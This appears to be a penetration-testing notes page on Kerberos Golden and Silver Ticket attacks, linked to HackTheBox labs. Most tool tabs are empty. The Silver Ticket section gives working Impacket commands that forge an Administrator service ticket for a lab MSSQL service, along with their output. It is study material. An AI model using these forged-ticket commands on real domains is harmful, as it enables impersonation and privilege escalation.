# Golden/Silver Ticket Attack

## Overview

The ticket attack abuses the service account's password hash.

## Golden Ticket Attack

The Golden Ticket Attack abuses the `krbtgt` account's password hash to issue the Kerberos ticket-granting tickets as the KDC to access the resources.

After the adversary gets the account `krbtgt`'s password hash, it can

* create a valid Kerberos TGT for any user in the domain and
* _manipulate that user’s_ [_PAC_](../../auth/kerberos.md#privilege-attribute-certificate-pac) _to gain additional privileges._

### Tools

{% tabs %}
{% tab title="Impacket" %}

{% endtab %}

{% tab title="Rubues" %}

{% endtab %}

{% tab title="Mimikatz" %}

{% endtab %}
{% endtabs %}

### Labs

* [Forest](../../../hackthebox/windows/forest.md#golden-ticket-attack)

## Silver Ticket Attack

Attackers can mint service-granting tickets without communicating to the KDC, if they get the password hash for the service account.

{% embed url="https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html" %}

### Tools

{% tabs %}
{% tab title="Impacket" %}
With a service account's password hash, we can mint a service-granting ticket without interacting with the DC.

{% code overflow="wrap" %}
```
$ impacket-ticketer -nthash <password-hash> -domain-sid <domain-sid> -domain sequel.htb -dc-ip escape -spn MSSQL/DC.SEQUEL.HTB Administrator
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
{% endcode %}

We can use the saved ccache file to authenticate to the service later.

```bash
$ export KRB5CCNAME=Administrator.ccache
$ impacket-mssqlclient -k dc.sequel.htb
...
SQL> select suser_name()
                       
--------------------   
sequel\Administrator 
```
{% endtab %}

{% tab title="Rubues" %}

{% endtab %}

{% tab title="Mimikatz" %}

{% endtab %}
{% endtabs %}

### Labs

* [Escape](../../../hackthebox/windows/escape.md#silver-ticket-attack)
